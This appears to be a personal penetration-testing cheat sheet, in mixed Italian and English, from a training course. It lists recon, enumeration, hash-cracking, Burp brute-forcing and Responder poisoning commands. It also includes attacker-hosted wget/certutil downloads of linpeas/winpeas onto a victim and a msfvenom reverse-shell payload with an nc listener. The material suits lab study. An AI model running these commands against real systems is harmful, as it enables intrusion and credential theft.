#### Virtual Box
Set VM internet:
- **Bridge** -->  conn a internet   (selezioni il ponte in base a se sei conn al wifi o ethern)
- **Nat** -->  conn a internet + conn tra diverse vm
            (click also Advanced > Promiscous mode: Allow All)

Per Nat:
devi creare una NatNetwork =>       - File > Tools > Network Manager
						     - seleziona Nat Networks
						     - Create

#### VM Ware 
How to install on ubuntu:
- go [here](https://www.vmware.com/products/workstation-player.html)
- download the .bundle file
- type `sudo bash VMware-Player.bundle`
- finish

##### Install VMWare Tools in ubuntu
follow [[Notes_ETH#Install VM Tools (guest addition)|these steps]]

-------
## Linux

`sudo -l`
 tells you which command you can execute as root without inserting the root password

`locate file.txt`
useful to find where a file/program is located   (to update the file type -->  `sudo updatedb`)


-------
## Tools
### Information Gathering
#### Netdiscover
tools for scanning the entire net to find hosts ip (using arp)
`sudo netdiscover -r 10.0.2.0/24`           -r = scan a given range instead of     
                                    auto scan

----
#### Nmap
tools for scanning ports to identify open ports
`nmap -T4 -p- -A 10.0.2.152`
`nmap -Pn --script smb-vuln* -p 139,445 10.0.2.152`

`-T4` —> set scan velocity from 1 to 5 (1 slow but complete - 5 fast but)
`-p-` —> scan all ports (without scann only 1000 most known) 
`-A` —> show me all that you found
`-Pn` --> treat all hosts as online -- skip host discovery

##### dnsrecon
tools for gathering DNS information
`dnsrecon -r 127.0.0.1/24 -n 10.0.2.154 -d blabla`
`-r `--> range (here we are scanning local host)
`-n` --> NS (victim ip that exposes dns)
`-d `--> domain (can write whatever you want but it's MANDATORY)

-----

### Enumerating 
#### Enumerating HTTP and HTTPS
##### Nikto
scanning website vulnerabilities
`nikto -h http://10.0.2.152`      -h = host

##### Dirbuster
finds hidden file/subdirectories website
`dirbuster`
![[Pasted image 20240214122906.png]]
- Faremo una scansione usando una wordlist predefinita di dirbuster 
- La wordlist —> contiene tanti subdomains noti (es /admin, /root, /…)
- Proverà per ciascuno di essi a vedere se esiste: es [http://10.0.2.152/admin](http://10.0.2.152/admin) e così via

- L’estensione serve a specificare quali tipologie di subdomain deve cercare
- mettendo solo php ⇒ cercherà l’esistenza di tutte le directory nella wordlist add il .php alla fine es [http://192.168.5.5/admin.php](http://192.168.5.5/admin.php)

Altre possibili estensioni —> pdf, rar, zip, docx … (+ ne metti e + è lunga la scans)

- Clicca su Tree View per vedere la struttura ad albero dei file trovati. 
- Se clicchi con il tasto dx su un file e apri nel browser ti mostrerà la pagina
![[Pasted image 20240214123126.png]]

##### dirb
finds hidden file/subdirectories website
`dirb http://10.0.2.152`
> [!INFO] 
> For each subdomains it finds =>  check inside that subdomains if there are others  
> =>
> is **<span style="color:#ff0000">recursive</span>** => can <span style="color:#ff0000">be slow</span>

##### ffuf
finds hidden file/subdirectories website
`sudo apt install ffuf`
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ_VARIABLE -u http://10.0.2.152/FUZZ_VARIABLE`
for each word inside the wordlist => try to find if it exists the webiste + word
> [!INFO] 
> by default it's not recursive
> =>
> Check only one deep layer => <span style="color:#00b050">faster</span>

-----
#### Enumerating SMB
##### Metasploit
If you don't know a lot of a protocol =>  search for it inside metasploit to see the modul
`search smb`
`use 0`
`info`
`options`
`set RHOSTS ...`
`run`

##### Smbclient
tries to connect anonimmously to smb file sharing
`smbclient -L \\\\\\\\10.0.2.152\\\\`                 (-L list)

> [!WARNING] Se da questo errore
> `protocol negotiation failed: NT_STATUS_IO_TIMEOUT`
> ⇒  modifica il file `/etc/samba/smb.conf` 
> Aggiungendo sotto “global”:
> `client min protocol = CORE` 
> `client max protocol = SMB3`

![[Pasted image 20240214124007.png]]

Try to connect to ADMIN$:
`smbclient -L \\\\\\\\10.0.2.152\\\\ADMIN$`
leave password empty

---
#### Enumerating DNS
##### dnsrecon
ss

----
### Hash
#### Hash-identifier
check if the string that you have is an hash and what type
`hash-identifier`
`paste hash`

#### hashcat
useful for cracking hash using wordlist         [[cheet#Locate]]
`locate wordlist.txt`
`hashcat -m 0 file_contains_hash.txt /path/wordlist.txt`
`-m 0` -->  use module 0 => crack md5

if you need to use a module that you don't know:
`hashcast --help | grep protocol`
and look for module number for the protocol that you need


> [!WARNING] 
> hashcat is heavy on GPU => it's bettere to avoid it inside a VM

----
### Crack
#### fcrackzip
cracks password protected zip files with brute force or dictionary based attacks
`fcrackzip -v -u -D -p /wordlist.txt zipName.zip`
`-v` -->  verbose
`-u` -->  unzip
`-D` --> Dictionary attack
`-p` -->  zip that we want to crack



-----
### Privilege Escalation
#### linpeas
automated tool to check if there are some potential priv escal inside the target
[linpeas github](https://github.com/carlospolop/PEASS-ng/releases/tag/20240211-db8c669a)
- Saved it locally inside a folder (+)
- create a server with python to download the script from the victim
- `cd (+)`
- `python3 -m http.server 80`
- from the victim shell:
	- `wget http://IP-ATTACKER/linpeas.sh`
	- `chmod +x linpeas.sh`
	- `./linpeas.sh`

#### winpeas
same as [[cheet#linpeas]] but -->  for windows
=>
automated tool to check if there are some potential priv escal inside the target
- download the .exe from [here](https://github.com/carlospolop/PEASS-ng/releases/tag/20240211-db8c669a)
- Saved it locally inside a folder (+)
- create a server with python to download the script from the victim
- `cd (+)`
- `python3 -m http.server 80`
- from the victim shell:
	- go inside a directory where you can write file
	- Use the correspective wget in windows
	- `certutil.exe -urlcache -f http://10.0.2.15/winpeas.exe winpeas.exe`   
	     (download from the ip winpeas.exe and save it as winpeas.exe)
	- `winpeas.exe`

----
## BurpSuite
### Bruteforcing Login
Set [[cheet#FoxyProxy]]
- Turn on the proxy
- Open Burp
- Go to Proxy 
- Click Intercept On
- Try a login in the website with random credentials
- Burp will intercept the request
	- Right Click on the request > Send to Intruder
	- From Intruder click "Clear"    (to clear the fields)
	- Select the username value in the request and click Add
	- Do the same for the password value
	- Select as Attack Type "Cluster Bomb"
	- Go to "Payloads"
	- Add all the possible usernames
	- Select "Payload Set" to 2 (so to set all the possible passwords)
	- Add all the possible passwords
	- Click Start "Attack"
	- Look for difference inside Status Code and Length
	Example with images -->  [[Notes/TCM/Capstones/Butler/report#BurpSuite]]
	
----
### Metasploit
#### Use a module
[[Notes/TCM/Capstones/Blue/report#Steps automated exploit|Use a module]]

#### Create and rename a shell
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f exe -o Wise.exe`
`-p` --> payload
`LHOST `--> attacker ip
`-f` -->  file type of the payload that we want create
`-o` -->  name of the payload

to listen for the reverse shell -->  `nc -nvlp 7777`

------
### Active Directory
#### Responder
LLMNR/NBT-NS/mDNS Poisoner
`sudo python3 Responder.py -I vmnet8 -dwPv`
`-I` -->   interface
`-d` -->  enable answers for DHCP broadcast requests (this option injects a WPAD server in the)
                                              DHCP response
`-w` -->  start a WPAD rogue proxy server (that allows a browser to automatically discover proxy)
`-P` -->  force NTLM authentication for the proxy
`-v` -->  verbose

after having found the the hash you can use -->  [[cheet#hashcat|hashcat]] (to decrypt the password)

> [!warning] 
> Need to be on the same network as the victim
> if it doesn't work try without `-P`
> if it fails try to kill apache server (`sudo /etc/init.d/apache2 stop`)

--------
## Sites
### GTFOBins 
curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems
[GTFOBins](https://gtfobins.github.io/)

----
### Browser Extensions
#### FoxyProxy 
Useful for settings Browser for using BurpSuite

add the firefox [extension](https://addons.mozilla.org/nl/firefox/addon/foxyproxy-basic/)
Go to the Settings > Add Proxy
Set the proxy in this way:
![[Pasted image 20240215140635.png]]
